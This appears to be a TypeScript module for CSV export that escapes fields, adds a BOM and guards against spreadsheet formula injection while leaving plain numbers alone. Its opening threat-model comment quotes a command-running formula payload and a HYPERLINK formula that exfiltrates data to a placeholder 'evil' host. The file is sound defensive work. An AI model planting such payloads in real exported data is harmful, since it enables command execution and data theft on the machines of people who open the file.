// 🔴 CSV-injection guard + RFC-4180 escaping + BOM. Security-critical.
//
// Threat model (design §8.3): cell values come from an ARBITRARY web page, i.e.
// untrusted input. A cell beginning with `= + - @` (or TAB/CR) is interpreted as
// a FORMULA by Excel/LibreOffice/Sheets, so `=cmd|'/c calc'!A0` or
// `=HYPERLINK("http://evil/?"&A1)` executes / exfiltrates on open.
//
// The exception that everyone else gets wrong: a cell that is a VALID NUMBER
// (`-5`, `+3.14`, `-1 234,56`) starts with a dangerous leader but is not a
// formula. Escaping it turns every negative rate in an accounting table into
// `'-5`. `isPlainNumber` is what prevents that (see the guard test in the PR).

import type { CsvDelimiter, CsvEol, FormulaGuard } from './types';

/** Characters that make a leading cell dangerous in a spreadsheet. */
const DANGEROUS_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * True when `raw` is unambiguously a NUMBER (optionally signed, spaces/NBSP as
 * thousands separators, `,`/`.` decimal, U+2212 minus). Such a cell is NOT a
 * formula risk and must NOT be escaped — otherwise every negative rate in a table
 * becomes `'-5`, the single most common bug in other implementations (design §8.3).
 */
export function isPlainNumber(raw: string): boolean {
  const s = raw
    .trim()
    .replace(/[\u00A0\u202F\u2009]/g, '') // NBSP / narrow NBSP / thin space
    .replace(/\u2212/g, '-') // real minus → hyphen
    .replace(/(?<=\d)[ ](?=\d)/g, ''); // ASCII thousands space between digits
  if (s === '') return false;
  // Accept 1 234,56 / -3.14 / +1000 forms with a single decimal separator.
  return /^[+-]?\d+(?:[.,]\d+)?$/.test(s);
}

/** Does this cell trigger the formula guard? (leading dangerous char, not a number)
 *
 * The leader is tested on the RAW first character, never on a trimmed copy: TAB
 * and CR are themselves dangerous leaders (some importers strip them, then see
 * the formula), so `trimStart()` here would delete the very characters the set
 * exists to catch. A genuine leading SPACE, by contrast, makes every spreadsheet
 * treat the cell as text — so `" =1+1"` is correctly NOT flagged. */
export function isFormulaRisk(raw: string): boolean {
  if (raw === '') return false;
  if (!DANGEROUS_LEADERS.has(raw[0]!)) return false;
  return !isPlainNumber(raw);
}

/**
 * Apply the guard to a single value (before RFC-4180 quoting). `escape` prefixes
 * an apostrophe (Excel shows it as text; the `'` lives in the formula bar, not the
 * cell). `keep`/`warn` leave data untouched (the UI gates those separately).
 */
export function guardValue(raw: string, mode: FormulaGuard): string {
  if (mode === 'escape' && isFormulaRisk(raw)) return `'${raw}`;
  return raw;
}

/** RFC-4180 field quoting: wrap in double quotes when it contains the delimiter,
 *  a quote, CR or LF; double any embedded quote. */
export function escapeField(value: string, delimiter: string): boolean {
  return (
    value.includes(delimiter) ||
    value.includes('"') ||
    value.includes('\n') ||
    value.includes('\r')
  );
}

function encodeField(value: string, delimiter: string): string {
  if (escapeField(value, delimiter)) return `"${value.replace(/"/g, '""')}"`;
  return value;
}

/** Resolve the 'auto' delimiter to a concrete char by page/browser locale
 *  (`;` for ru/de-style list separators, else `,`). Design §3. */
export function resolveDelimiter(delimiter: CsvDelimiter, locale: string): string {
  if (delimiter !== 'auto') return delimiter;
  const semicolonLocales = /^(ru|de|fr|es|it|pl|cs|nl|pt|tr|uk)/i;
  return semicolonLocales.test(locale) ? ';' : ',';
}

export const BOM = '﻿';

export interface CsvOptions {
  delimiter: CsvDelimiter;
  encoding: 'utf8-bom' | 'utf8';
  eol: CsvEol;
  formulaGuard: FormulaGuard;
  sepLine: boolean;
  locale: string;
}

/**
 * Build the CSV as an ARRAY OF CHUNKS, ready for `new Blob(parts)`.
 *
 * ⚠️ Never `s += cell` (design §9.1): string concatenation over 60 000 cells is
 * O(n²). We build per-row strings, group them into chunks, and hand the array
 * straight to `Blob` — no intermediate giant string ever exists.
 */
export function buildCsvParts(
  rows: readonly string[][],
  opts: CsvOptions,
  chunkRows = 500,
): string[] {
  const delim = resolveDelimiter(opts.delimiter, opts.locale);
  const eol = opts.eol === 'crlf' ? '\r\n' : '\n';

  const parts: string[] = [];
  if (opts.encoding === 'utf8-bom') parts.push(BOM);
  // ⚠️ `sep=;` helps Excel but breaks pandas/Sheets (design §2.3) — opt-in only.
  if (opts.sepLine) parts.push(`sep=${delim}${eol}`);

  let buf: string[] = [];
  for (let i = 0; i < rows.length; i++) {
    buf.push(
      rows[i]!
        .map((cell) => encodeField(guardValue(cell, opts.formulaGuard), delim))
        .join(delim),
    );
    if (buf.length >= chunkRows) {
      parts.push(buf.join(eol) + (i + 1 < rows.length ? eol : ''));
      buf = [];
    }
  }
  if (buf.length) parts.push(buf.join(eol));
  return parts;
}

/**
 * The exact CSV text — what the dialog's "raw bytes" tab shows and what the file
 * contains, byte for byte ("the preview IS the spec", design §6.8). Only used for
 * the (short) preview and by tests; the file itself goes through `buildCsvParts`.
 */
export function buildCsv(rows: readonly string[][], opts: CsvOptions): string {
  return buildCsvParts(rows, opts).join('');
}

/** How many cells the guard would escape — the exact count the preview shows. */
export function countGuarded(rows: readonly string[][]): number {
  let n = 0;
  for (const row of rows) for (const cell of row) if (isFormulaRisk(cell)) n++;
  return n;
}

/** MIME types we hand to `new Blob`. `charset=utf-8` is not optional: without it
 *  (and without the BOM) Excel reads a Cyrillic CSV as mojibake. */
export const MIME: Record<string, string> = {
  csv: 'text/csv;charset=utf-8',
  md: 'text/markdown;charset=utf-8',
  txt: 'text/plain;charset=utf-8',
  xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
};
